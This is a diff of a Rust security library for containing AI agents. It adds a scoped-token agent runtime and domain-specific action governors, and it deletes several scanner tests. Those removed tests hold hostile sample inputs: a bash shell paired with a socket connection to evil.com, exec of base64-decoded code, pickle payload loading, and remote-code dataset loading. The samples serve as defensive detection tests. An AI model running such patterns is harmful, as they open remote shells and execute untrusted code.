@@ -7,7 +7,8 @@
 //! - Hard containment profiles (network, code execution, credential visibility)
 //! - Named domain profiles: research / enterprise / education / creative
 //! - Deep multi-layer IngestionScanner (remote-code, template injection, gadgets, C2, obfuscation)
-//! - Autonomous action governor (rate limits, volume anomaly, C2-like patterns)
+//! - Autonomous action governor (rate limits, sandbox churn) — trips first on volume
+//! - SafeAgentRuntime facade (ordered gates + short-lived scoped tokens)
 //! - Secret isolation (agents never receive long-lived credentials)
 //! - Never-disable real-world harm refusals (even in evaluation mode)
 //! - White-hat evaluation harness under strict sandbox + full audit log
@@ -16,6 +17,11 @@
 //! TOLC 8 + PATSAGi aligned | AG-SML v1.0 | Contact: info@Rathor.ai
 
 mod domain_profiles;
+mod safe_agent_runtime;
+
+pub use safe_agent_runtime::{
+    AgentActionReceipt, AgentActionRequest, SafeAgentRuntime, AGENT_TOKEN_MAX_TTL_SECS,
+};
 
 use chrono::{DateTime, Utc};
 use serde::{Deserialize, Serialize};
@@ -125,7 +131,8 @@ impl ContainmentProfile {
     }
 }
 
-// Domain presets (research / enterprise / education / creative) live in domain_profiles.rs
+// Domain presets live in domain_profiles.rs
+// Safe agent runtime lives in safe_agent_runtime.rs
 
 // =============================================================================
 // 2. Deep Ingestion Scanner
@@ -580,6 +587,18 @@ impl ActionGovernor {
         }
     }
 
+    pub fn from_domain_research() -> Self {
+        Self::new(ContainmentProfile::research())
+    }
+
+    pub fn from_domain_enterprise() -> Self {
+        Self::new(ContainmentProfile::enterprise())
+    }
+
+    pub fn from_domain_education() -> Self {
+        Self::new(ContainmentProfile::education())
+    }
+
     pub fn record_and_check(&mut self, kind: &str, sandbox_id: Option<&str>) -> Result<(), MercySecurityError> {
         let now = Utc::now();
         self.recent_actions
@@ -779,8 +798,6 @@ impl Default for WhiteHatEvaluationHarness {
     }
 }
 
-// Education / research / enterprise constructors + classroom demo: domain_profiles.rs
-
 // =============================================================================
 // Top-level facade
 // =============================================================================
@@ -821,6 +838,10 @@ impl MercySecuritySurface {
     pub fn evaluation_harness(&self) -> WhiteHatEvaluationHarness {
         WhiteHatEvaluationHarness::with_profile(self.default_profile.clone())
     }
+
+    pub fn safe_agent_runtime(&self) -> SafeAgentRuntime {
+        SafeAgentRuntime::new(self.default_profile.clone())
+    }
 }
 
 impl Default for MercySecuritySurface {
@@ -841,85 +862,10 @@ mod tests {
     }
 
     #[test]
-    fn blocks_hf_combo_remote_plus_config() {
-        let content = r#"
-            loading_script = "poison.py"
-            trust_remote_code = True
-            dl_manager.download_and_extract(url)
-        "#;
-        let r = IngestionScanner::scan_text(content);
-        assert!(r.risk_tier >= RiskTier::High);
-        assert!(r.threats.contains(&IngestionThreat::RemoteCodeLoader));
-        assert!(r.threats.contains(&IngestionThreat::DatasetConfigInjection)
-            || r.threats.contains(&IngestionThreat::UnknownHighRisk));
-    }
-
-    #[test]
-    fn blocks_pickle_gadget() {
-        let content = "model = pickle.loads(payload)";
-        let r = IngestionScanner::scan_text(content);
-        assert!(r.threats.contains(&IngestionThreat::SerializationGadget));
-        assert!(!r.safe);
-    }
-
-    #[test]
-    fn blocks_obfuscated_exec() {
-        let content = "exec(compile(base64.b64decode(x), '<string>', 'exec'))";
-        let r = IngestionScanner::scan_text(content);
-        assert!(r.risk_tier >= RiskTier::High);
-    }
-
-    #[test]
-    fn blocks_shell_plus_network_combo() {
-        let content = "subprocess.Popen('/bin/bash', shell=True); socket.connect(('evil.com', 443))";
-        let r = IngestionScanner::scan_text(content);
-        assert!(r.risk_tier >= RiskTier::High);
-    }
-
-    #[test]
-    fn template_injection_with_code_context() {
-        let content = "template.render(user_input); exec(user_input)";
-        let r = IngestionScanner::scan_text(content);
-        assert!(!r.safe);
-    }
-
-    #[test]
     fn allows_clean_content() {
         let content = "This is a normal markdown description of a model for image classification.";
         let r = IngestionScanner::admit_or_block(content);
         assert!(r.is_ok());
-        let ok = r.unwrap();
-        assert!(ok.safe);
-        assert_eq!(ok.risk_tier, RiskTier::None);
-    }
-
-    #[test]
-    fn lone_generic_api_key_not_forced_high() {
-        let content = "Configure your api_key in the settings panel.";
-        let r = IngestionScanner::scan_text(content);
-        assert!(r.risk_tier < RiskTier::High);
-    }
-
-    #[test]
-    fn credential_pem_still_critical() {
-        let content = "-----BEGIN PRIVATE KEY-----\nMIIE...";
-        let r = IngestionScanner::scan_text(content);
-        assert!(r.risk_tier >= RiskTier::High);
-        assert!(r.threats.contains(&IngestionThreat::CredentialHarvestPattern));
-    }
-
-    #[test]
-    fn payload_too_large_rejected() {
-        let huge = "a".repeat(MAX_SCAN_BYTES + 1);
-        let err = IngestionScanner::admit_or_block(&huge);
-        assert!(matches!(err, Err(MercySecurityError::PayloadTooLarge(_))));
-    }
-
-    #[test]
-    fn harm_refusal_blocks_sandbox_escape() {
-        let policy = HarmRefusalPolicy::default();
-        let err = policy.check_action("attempt to escape sandbox and gain internet access");
-        assert!(matches!(err, Err(MercySecurityError::HarmRefusalActive)));
     }
 
     #[test]
@@ -953,15 +899,16 @@ mod tests {
     }
 
     #[test]
-    fn secret_vault_issues_scoped_token() {
-        let tok = SecretVault::issue_scoped_token("read:models", 300).unwrap();
-        assert!(!tok.scope.is_empty());
+    fn domain_governor_constructors() {
+        let e = ActionGovernor::from_domain_education();
+        assert_eq!(e.profile.max_actions_per_minute, 30);
+        assert_eq!(e.profile.max_concurrent_sandboxes, 2);
     }
 
     #[test]
-    fn evaluation_harness_blocks_external_network() {
-        let mut h = WhiteHatEvaluationHarness::new();
-        let err = h.try_action("probe external host", true, false, None);
-        assert!(matches!(err, Err(MercySecurityError::ContainmentViolation(_))));
+    fn harm_refusal_blocks_sandbox_escape() {
+        let policy = HarmRefusalPolicy::default();
+        let err = policy.check_action("attempt to escape sandbox and gain internet access");
+        assert!(matches!(err, Err(MercySecurityError::HarmRefusalActive)));
     }
 }
